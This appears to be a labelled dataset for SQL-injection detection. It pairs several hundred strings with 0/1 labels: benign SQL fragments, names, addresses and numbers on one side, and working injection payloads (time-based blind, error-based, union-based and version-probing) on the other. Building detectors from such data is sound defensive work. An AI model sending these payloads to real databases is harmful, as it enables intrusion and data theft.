payload	label
1   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   9313  =  9313	1
cuerva	0
1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa	1
"1""  )   as mwja where 7881  =  7881 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --"	1
sadoc	0
SELECT COUNT ( fierceID ) FROM safety	0
  SELECT massage,built,enemy FROM order LEFT JOIN Orders ON immediately.religiousID =  paragraph.although ORDER BY bee.desert	0
yern	0
5727410000000000	0
 UPDATE above SET try = 'stand'WHERE silly = 'society'	0
pg_sleep  (  __TIME__  )  --	1
open3	0
1   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  1748  =  1748	1
guillen	0
l1am217r5	0
1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'tqvy' like 'tqvy	1
SELECT * FROM frighten WHERE NOT figure = 'list'  AND NOT apart = 'heavy'	0
SELECT month ( s )  FROM selection	0
SELECT COUNT ( DISTINCT final )  FROM fifty	0
-6160'   )    )     )   or make_set  (  1924  =  4415,4415  )   and    (    (     (  'hayr'  =  'hayr	1
SELECT * FROM kill FETCH FIRST 3 ROWS ONLY	0
49699	0
"-1197""   )    )    as dfsy where 8857  =  8857 or 3038  =  3038"	1
1   )    )    as bebl where 2597  =  2597   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --	1
SELECT * FROM doll WHERE    NOT shaking = 'soon'	0
SELECT AVG ( say ) FROM shirt SELECT SUM ( desert ) 	0
calle juan agui 97 9-e	0
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #	1
select   (  case when   (  3076  =  3596  )   then 3076 else 3076*  (  select 3076 from mysql.db  )   end  )  #	1
mejury8	0
  SELECT * FROM call WHERE flight IN  ( 'become', 'who', 'basket' )  	0
SELECT * FROM join WHERE bad = 'rain'  OR silent = 'possible'	0
calle florian de ocampo 114, 7?h	0
1'+  (  select xruo where 5709  =  5709 and 7533  =  7533  )  +'	1
"1""  )   where 6632  =  6632 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --"	1
c/ gerardo de alvear, 119 10f	0
1'  )   where 2208  =  2208 rlike sleep  (  5  )  #	1
SELECT * FROM  ( SELECT clock FROM chest ) 	0
973	0
SELECT MIN ( food )  AS source FROM both	0
SELECT TOP 50 PERCENT * FROM chemical	0
SELECT * FROM may WHERE oxygen NOT BETWEEN 'trail' AND 'bring'	0
DELETE FROM today	0
   SELECT land,flower,shop,alike,list     (  (  stone JOIN gold ON column.solution =  heading.football )   INNER JOIN eastON Orders.has =  shirt.probablyID ) 	0
SELECT TOP 3 * FROM tobacco	0
SELECT * FROM hardly WHERE    NOT itself = 'trade'	0
1  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
SELECT * FROM escape WHERE everybody = 'action' LIMIT 3	0
caaveruelas	0
SELECT * FROM halfway WHERE hello NOT BETWEEN 'stove' AND 'cow'	0
1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi	1
1'   )    )    as crzr where 5373  =  5373 and elt  (  3114  =  3114,sleep  (  5   )    )   #	1
1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'pufu' like 'pufu	1
 SELECT column_name ( s )  FROM our,limited	0
SELECT AVG ( Price ) FROM answer	0
" select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1"	1
8095700000000001	0
29360	0
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_wp_stateless_google_sdk_conflict' LIMIT 1	0
sarmiento	0
"-9057""  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #"	1
-9606 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # iuij	1
SELECT * FROM sit FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM apart	0
"-9062"" or 6872  =  6872 and ""aumq"" like ""aumq"	1
   SELECT left, command, respect FROM sail WHERE worried  IS NULL	0
select sleep  (  5  )  --	1
1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'rpiz' like 'rpiz	1
SELECT * FROM lucky WHERE stream = 'seems'	0
c/ cofa 39	0
6467100000000000	0
select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4	1
1,  (  select   (  case when   (  8382  =  8382  )   then 1 else 1/  (  select 0  )   end   )    )   	1
3046	0
"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""tjbe"" like ""tjbe"	1
select sleep  (  5  )   and   (  'vwmx'  =  'vwmx	1
SELECT * FROM nothing WHERE milk BETWEEN '1996-07-01' AND '1996-07-31'	0
SELECT * FROM garage WHERE Price NOT BETWEEN 10 AND 20	0
select   (  case when   (  9130  =  1826  )   then 9130 else 9130*  (  select 9130 from mysql.db  )   end  )  #	1
SELECT column_name FROM table1 UNION	0
1  )   as fxfe where 1148  =  1148 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #	1
SELECT option_value FROM wp_options WHERE option_name  =  'houzez_ptype_settings' LIMIT 1	0
"1%""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #"	1
SELECT * FROM brown WHERE Price NOT BETWEEN 10 AND 20	0
SELECT MIN ( damage )  AS won FROM sea	0
"1""  )   where 9086  =  9086 or sleep  (  5  )  #"	1
-3136%'  )   or 3400  =  6002	1
-5571' union all select 8846,8846,8846,8846,8846,8846,8846#	1
1'||  (  select 'ypqa' where 1961  =  1961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||'	1
"1""  )   where 7514  =  7514"	1
   SELECT Employees.pound, COUNT ( Orders.carryID )  AS produceFROM    ( OrdersINNER JOIN whatever ON Orders.hurtID  =  Employees.asID ) 	0
SELECT moving ( s FROM none RIGHT JOIN	0
SELECT * FROM anyone 3 SELECT * FROM base	0
SELECT * FROM seed WHERE hot = 'lovely'  OR conversation = 'century'	0
   SELECT passage, mine+ ', ' + tiny+ ' ' + mail+ ', ' + character AS capital  FROM importance	0
SELECT COUNT ( womenID ) FROM merely	0
 select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'	1
redolat cardiel	0
SELECT * FROM standard WHERE    NOT nature = 'anyway'	0
1'+  (  select 'ezpy' where 5282  =  5282 order by 1#	1
"1""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""eeye""  =  ""eeye"	1
1,row  (  7937,5067  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 9974 union select 5497 union select 8209 union select 8147  )  a group by x  )  	1
9.19E+015	0
roldan	0
-3462   )    )    as biyl where 5143  =  5143 union all select 5143,5143,5143--	1
50174	0
SELECT * FROM length WHERE NOT pen = 'none'  AND NOT case = 'powerful'	0
SELECT * FROM compass	0
-5810 union all select 6307,6307,6307,6307,6307,6307,6307--	1
closa ortell	0
FROM  ( SELECT DISTINCT bark FROM older ) 	0
SELECT * FROM seldom WHERE NOT union = 'drove'  AND NOT window = 'liquid'	0
0 or 1  =  1	1
select count  (  *  )   from generate_series  (  1,5000000  )   and   (  8997  =  8997	1
 SELECT column_name ( s )  FROM least,composed	0
angullo acosta	0
1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- mtaq	1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  ""bqfj"" like ""bqfj"	1
"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #"	1
60201082p	0
99eja36r9a	0
1'+  (  select luwn where 1214  =  1214 union all select null,null,null,null,null,null#	1
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  +'	1
SELECT * FROM by WHERE quickly = 'pain' LIMIT 3	0
1  )   as selm where 5759  =  5759	1
4859430000000000	0
aricel	0
SELECT TOP 3 * FROM attack WHERE doctor = 'coat' SELECT * FROM smaller	0
SELECT * FROM citizen WHERE explanation = 'office' LIMIT 3	0
1'  )   where 9221  =  9221 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --	1
concejo de alzuza, 47,	0
c/ rafael belmonte garcia, 29,	0
SELECT * FROM hand WHERE fire BETWEEN motor09/01/1996yesterday AND policeman15/31/1996industrial	0
5955500000000000	0
SELECT lonely	0
1' and elt  (  9371  =  8882,8882  )   and 'vurh'  =  'vurh	1
SELECT * FROM printed WHERE halfway BETWEEN 'degree' AND 'blew'	0
1' and 7533  =  7533 and 'frvk'  =  'frvk	1
bertolda	0
   SELECT hope,keep,good,bicycle,condition     (  (  excellent JOIN main ON plant.cost =  attention.date )   INNER JOIN lionON Orders.disease =  quick.copyID ) 	0
1%'  )   and 4061  =  2730#	1
SELECT * FROM worth FETCH FIRST 50 PERCENT ROWS ONLY	0
"1""  )   as zopq where 2680  =  2680"	1
20048048y	0
select * from users where id  =  '1' or \<$ or 1  =  1 -- 1'	1
1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) 	1
SELECT * FROM scale	0
"-9859""   )    )     )   union all select 6595,6595,6595,6595,6595,6595,6595#"	1
   SELECT pond,minerals,vowel,became,blew     (  (  usual JOIN note ON important.dollar =  around.problem )   INNER JOIN shareON Orders.point =  however.motherID ) 	0
8045890000000000	0
"-2321%""  )   or 2271  =  7683--"	1
  SELECT orID AS ID, it AS soft FROM directly	0
SELECT difference	0
SELECT member ( s )  FROM mood SELECT clothing ( s ) 	0
1%' and sleep  (  5  )  #	1
sant llus	0
hymen_israeli@aulahost.vc	0
SELECT * FROM necessary WHERE money = 'wash'  AND  ( slow = 'office' OR shadow = 'glass' ) 	0
SELECT * FROM pet WHERE piece NOT LIKE 'purpose%'	0
"1"" where 4366  =  4366 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --"	1
entrada tamarit, 32,	0
" select * from users where id  =  1 or 1#""? or 1  =  1 -- 1"	1
"1"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""pmpk"" like ""pmpk"	1
34260	0
9.57318E+015	0
"-9854%""   )    )     )   or 6455  =  3652"	1
arroyo prado del rey 60,	0
DELETE FROM species WHERE monkey = 'somewhere'	0
callie	0
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bzxo' like 'bzxo	1
3690	0
SELECT sink ( s )  FROM purpose SELECT easy ( s ) 	0
SELECT MIN ( ready )  AS pleasant FROM state	0
8l077ra	0
a2o2e5	0
1'+  (  select ggah where 3263  =  3263 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   +'	1
SELECT AVG ( feature ) FROM wheel SELECT SUM ( one ) 	0
" select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1"	1
select   (  case when   (  2768  =  8868  )   then 2768 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--	1
FROM  ( SELECT DISTINCT twice FROM larger ) 	0
"1""  )   rlike sleep  (  5  )   and   (  ""efoq"" like ""efoq"	1
FROM  ( SELECT DISTINCT ran FROM outline ) 	0
1  )   where 1443  =  1443 union all select null,null,null,null,null#	1
1   )    )     )   union all select null,null,null--	1
SELECT led FROM camera UNION SELECT claws FROM hello ORDER BY outside	0
capa0r980	0
1  )   as ktfu where 2637  =  2637	1
SELECT TOP 3 * FROM at WHERE loud = 'shop' SELECT * FROM actually	0
1%'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '	1
SELECT * FROM underline FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM pain	0
SELECT * FROM club WHERE with  BETWEEN 10 AND 20	0
"1""  )   as wmng where 5976  =  5976"	1
SELECT * FROM sunlight WHERE tired = 'coming'  AND City = 'watch'	0
maheu	0
insert	1
savitsky@tetdevelocidad.sj	0
SELECT * FROM truth 3	0
6425500000000000	0
19310	0
1   )    )    as cdhd where 2958  =  2958 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
SELECT * FROM wild WHERE NOT sleep = 'halfway'  AND NOT union = 'create'	0
-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--	1
  SELECT * FROM dollar WHERE right NOT IN  ( 'inside', 'dear', 'melted' )  	0
SELECT MIN ( cry )  AS travel FROM silly	0
  SELECT difficultyID AS ID, save AS even FROM highest	0
  SELECT damageID AS ID, fact AS wherever FROM wolf	0
1' where 2183  =  2183	1
  SELECT smell,perhaps FROM independent WHERE citizen = 'leg' UNION SELECT win, positive FROM deep	0
SELECT column_name ( s ) FROM table1RIGHT JOIN	0
SELECT * FROM herd FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM supply	0
hanley	0
" SELECT CONCAT ( Address, "" "", PostalCode, "" "", City )  AS Address FROM  Customers;"	0
calle torreta 126 9c	0
freydig rueda	0
 select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1	1
SELECT COUNT ( youthID ) FROM greatest	0
algu chavarri	0
SELECT AVG ( layers ) FROM lady SELECT SUM ( writing ) 	0
SELECT TOP 3 * FROM magic	0
"1""  )   where 2367  =  2367"	1
nebila	0
1' in boolean mode  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --	1
SELECT COUNT ( boneID ) FROM blank	0
plza. felix rodriguez de la fuente 140 3a	0
calle bendicion 160	0
"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly"	1
"1""   )    )    and   (  7467  =  7962  )  *7962 and    (    (   ""nhld""  =  ""nhld"	1
SELECT * FROM vegetable WHERE by = 'wonderful' LIMIT 3	0
 or 1 in   (  select @@version  )  --	1
SELECT * FROM  ( SELECT dance FROM grain ) 	0
 SELECT * FROM helpful ORDER BY new, new	0
gatada	0
SELECT * FROM money 3	0
  SELECT weighID AS ID, repeat AS thought FROM office	0
"1""   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  ""rtzn""  =  ""rtzn"	1
1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #	1
SELECT MIN ( thrown )  AS poor FROM evening	0
SELECT COUNT ( gladID ) FROM pair	0
iza	0
5719	0
1'+  (  select 'qylf' where 6984  =  6984 and 2255  =  5094	1
20491	0
15	0
SELECT AVG ( several ) FROM upward SELECT SUM ( identity ) 	0
1  )   as yduh where 6481  =  6481 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --	1
 SELECT * FROM heart ORDER BY lucky ASC, comfortable DESC	0
-9445  )   as dmur where 4371  =  4371 union all select 4371,4371,4371,4371,4371,4371,4371,4371,4371,4371#	1
6449110000000000	0
carrera	0
SELECT TOP 3 * FROM hot	0
winde	0
call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup	1
SELECT * FROM plant	0
  SELECT verb,blind,loss FROM hit LEFT JOIN Orders ON shore.careID =  string.water ORDER BY first.strike	0
*paci3nte	0
1'   )    )    as ijyi where 3694  =  3694   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --	1
"1""   )    )    or sleep  (  5  )  #"	1
-8703'  )   where 9723  =  9723 union all select 9723,9723,9723,9723,9723#	1
1%'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  '%'  =  '	1
1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   'kmjn'  =  'kmjn	1
SELECT TOP 50 PERCENT * FROM tried	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 347687 )  ORDER BY meta_id ASC	0
SELECT * FROM anyway WHERE master = 'title'	0
SELECT AVG ( block ) FROM sure SELECT SUM ( his ) 	0
SELECT COUNT ( leather ) FROM play	0
SELECT * FROM gold WHERE interest = 'television'  OR sang = 'average'	0
   SELECT south, president+ ', ' + heat+ ' ' + fact+ ', ' + finger AS which  FROM leader	0
"1""   )    )    as sgln where 7573  =  7573"	1
   SELECT cold, garage, brownFROM orange WHERE coal  IS NOT NULL	0
SELECT * FROM lot  WHERE there NOT LIKE '[dozen]%'	0
aizpuru cerusoli	0
" select * from users where id  =  1 or "";#"" or 1  =  1 -- 1"	1
SELECT * FROM copy WHERE rough NOT LIKE 'two%'	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367678,299806,299807,367679,299808,80777,30322,80782,28561,262315,299804,30387,228217,367680,367681,367682,367683,367684,367685,367686,30220,262317,30380,80779,30384,30390,80780,290065,291072,320706 )  ORDER BY meta_id ASC	0
"1"" rlike   (  select   (  case when   (  3711  =  3313  )   then 1 else 0x28 end   )    )    and ""iqlh"" like ""iqlh"	1
vish	0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""tbcc""  =  ""tbcc"	1
1 and 7533  =  7533	1
SELECT * FROM other	0
1'   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
SELECT AVG ( hospital ) FROM crop	0
SELECT MIN ( pool )  AS earlier FROM happen	0
SELECT * FROM friend WHERE were NOT LIKE '[seed]%'	0
28295	0
"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""jbty"" like ""jbty"	1
SELECT highway ( s )  FROM which FULL OUTER JOIN	0
1   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--	1
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual#	1
945491000000000	0
SELECT * FROM  ( SELECT tin FROM success ) 	0
orea	0
SELECT TOP 50 PERCENT * FROM perfect	0
1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   	1
SELECT sentence ( s FROM top RIGHT JOIN	0
"1%""   )    )     )   and 2006  =  2006"	1
SELECT AVG ( raise )  FROM declared  SELECT SUM ( tongue ) 	0
SELECT * FROM rhyme WHERE sink IN  ( SELECT furniture FROM our ) 	0
SELECT AVG ( mixture )  FROM raw  SELECT SUM ( pattern ) 	0
SELECT * FROM running WHERE song = 'window'  AND  ( deeply = 'slight' OR exciting = 'sale' ) 	0
INSERT INTO attack ( fierce, manufacturing, tree, settlers, built, magnet )  VALUES  ( 'condition', 'journey'. difficult', 'gather', 'equator', 'shade', 'giant' )  	0
"-1598""   )    )    or elt  (  5329  =  9628,9628  )   and    (    (   ""hyxq"" like ""hyxq"	1
plza. carmelo solis, 78, 4?g	0
SELECT COUNT ( examine ) FROM congress	0
22513	0
SELECT * FROM since WHERE think BETWEEN 'friend' AND 'gradually'	0
-1593' or elt  (  7044  =  6125,6125  )   and 'zkuz'  =  'zkuz	1
oplinger	0
6966780000000000	0
SELECT metal ( s )  FROM involved LEFT JOIN	0
1%'   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   '%'  =  '	1
   SELECT track, frog, orderFROM bend WHERE prize  IS NOT NULL	0
" select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1"	1
SELECT Count ( * )  AS clean	0
SELECT AVG ( but ) FROM improve SELECT SUM ( cross ) 	0
c/ auroros 173	0
-7548 or 2850  =  9666	1
order by	1
SELECT TOP 3 * FROM house WHERE naturally = 'area'	0
1   )    )    as fmpr where 3103  =  3103 and elt  (  9970  =  9297,9297  )  --	1
1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  	1
